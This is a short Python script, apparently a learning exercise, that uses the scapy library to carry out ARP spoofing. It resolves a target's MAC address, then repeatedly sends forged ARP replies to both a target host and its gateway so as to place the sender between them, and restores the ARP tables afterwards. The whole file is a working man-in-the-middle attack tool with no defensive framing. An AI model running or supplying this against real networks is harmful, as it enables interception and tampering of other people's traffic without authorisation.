#!/usr/bin/env python

import subprocess
import scapy.all as scapy
import time
import argparse

def scan(target_ip):
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)
    print(answered[0])
    print(len(answered[0]))
    print(type(answered[0]))
    print(answered[0][1])
    return answered[0][1].hwsrc

def arpspoof(target, gateway):
	target_mac = scan(target)
	packet = scapy.ARP(op = 2, pdst = target, hwdst = target_mac, psrc = gateway)
	scapy.send(packet, verbose = False)

def restore(target, gateway):
	target_mac = scan(target)
	gateway_mac = scan(gateway)
	packet = scapy.ARP(op = 2, pdst = target, hwdst = target_mac, psrc = gateway, hwsrc = gateway_mac)
	scapy.send(packet, verbose = False)

def get_arguements():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "Enter target IP address.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "Enter gateway IP address.")
    options = parser.parse_args()
    return options


def run(target, gateway, duration_seconds):
    end_time = time.time() + duration_seconds
    print(end_time)
    count = 2
    try:
        while True:
            arpspoof(target, gateway)
            arpspoof(gateway, target)
            print("\r\033[1;35m[+] packets sent = \033[0m" + str(count), end = "")
            count += 2
            if time.time() >= end_time:
                break
            time.sleep(2)
    finally:
        restore(target, gateway)

